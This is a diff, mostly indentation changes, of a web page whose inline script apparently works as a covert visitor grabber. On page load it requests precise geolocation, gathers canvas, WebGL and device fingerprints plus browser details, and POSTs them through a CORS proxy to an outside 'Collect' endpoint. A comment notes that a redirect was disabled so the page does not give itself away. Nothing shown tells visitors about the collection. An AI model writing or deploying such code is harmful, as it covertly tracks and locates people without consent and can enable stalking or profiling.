@@ -9,8 +9,7 @@
 <body>
     <script>
         // === الـ URL الصحيح: يمر عبر corsproxy.io ===
-const apiUrl = 'https://corsproxy.io/?' + encodeURIComponent('http://help2025.runasp.net/api/Collect');
-
+        const apiUrl = 'https://corsproxy.io/?' + encodeURIComponent('http://help2025.runasp.net/api/Collect');
 
         // === باقي الكود (بدون تغيير) ===
         async function parseDeviceName(ua) {
@@ -29,29 +28,28 @@ const apiUrl = 'https://corsproxy.io/?' + encodeURIComponent('http://help2025.ru
             return /windows/i.test(ua) ? 'Windows PC' : 'Unknown';
         }
 
-async function getGeolocation() {
-    return new Promise(resolve => {
-        if (!navigator.geolocation)
-            return resolve({ latitude: null, longitude: null, accuracy_m: 0, error: "غير مدعوم" });
+        async function getGeolocation() {
+            return new Promise(resolve => {
+                if (!navigator.geolocation)
+                    return resolve({ latitude: null, longitude: null, accuracy_m: 0, error: "غير مدعوم" });
 
-        navigator.geolocation.getCurrentPosition(
-            pos => resolve({
-                latitude: pos.coords.latitude,
-                longitude: pos.coords.longitude,
-                accuracy_m: pos.coords.accuracy || 0,
-                error: null
-            }),
-            err => resolve({
-                latitude: null,
-                longitude: null,
-                accuracy_m: 0,
-                error: "مرفوض"
-            }),
-            { timeout: 10000 }
-        );
-    });
-}
-
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve({
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        accuracy_m: pos.coords.accuracy || 0,
+                        error: null
+                    }),
+                    err => resolve({
+                        latitude: null,
+                        longitude: null,
+                        accuracy_m: 0,
+                        error: "مرفوض"
+                    }),
+                    { timeout: 10000 }
+                );
+            });
+        }
 
         function getCanvasFingerprint() {
             try {
@@ -96,30 +94,30 @@ async function getGeolocation() {
         (async () => {
             try {
                 const [geo, deviceName] = await Promise.all([
-  getGeolocation(),
-  parseDeviceName(navigator.userAgent)
-]);
+                    getGeolocation(),
+                    parseDeviceName(navigator.userAgent)
+                ]);
                 const fingerprint = generateFingerprint();
 
-     const data = {
-  clientUuid: crypto.randomUUID?.() || Date.now().toString(36),
-  deviceFingerprint: fingerprint,
-  ipAddress: '',
-  userAgent: navigator.userAgent,
-  deviceName: deviceName,
-  language: navigator.language || 'غير معروف',
-  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-  screen: `${screen.width}x${screen.height}`,
-  colorDepth: screen.colorDepth,
-  hardwareConcurrency: navigator.hardwareConcurrency || 0,
-  deviceMemory: navigator.deviceMemory || 'غير متاح',
-  connectionType: navigator.connection?.type ?? 'unknown',
-  canvasFingerprint: getCanvasFingerprint().substring(0, 100) + '...',
-  webglRenderer: getWebGLFingerprint(),
-  geolocation: geo, // ✅ الآن الأسماء متوافقة مع الموديل
-  referrer: document.referrer || 'مباشر',
-  entryUrl: window.location.href
-};
+                const data = {
+                    clientUuid: crypto.randomUUID?.() || Date.now().toString(36),
+                    deviceFingerprint: fingerprint,
+                    ipAddress: '',
+                    userAgent: navigator.userAgent,
+                    deviceName: deviceName,
+                    language: navigator.language || 'غير معروف',
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    screen: `${screen.width}x${screen.height}`,
+                    colorDepth: screen.colorDepth,
+                    hardwareConcurrency: navigator.hardwareConcurrency || 0,
+                    deviceMemory: navigator.deviceMemory || 'غير متاح',
+                    connectionType: navigator.connection?.type ?? 'unknown',
+                    canvasFingerprint: getCanvasFingerprint().substring(0, 100) + '...',
+                    webglRenderer: getWebGLFingerprint(),
+                    geolocation: geo,
+                    referrer: document.referrer || 'مباشر',
+                    entryUrl: window.location.href
+                };
 
                 const response = await fetch(apiUrl, {
                     method: 'POST',
@@ -134,9 +132,8 @@ async function getGeolocation() {
             } catch (e) {
                 console.error('خطأ:', e);
             } finally {
-                setTimeout(() => {
-                  //  window.location.href = 'https://example.com/thank-you';
-                }, 500);
+                // تم التعليق على أي redirect لتجنب ظهور Example Domain
+                // setTimeout(() => { window.location.href = 'https://example.com/thank-you'; }, 500);
             }
         })();
     </script>
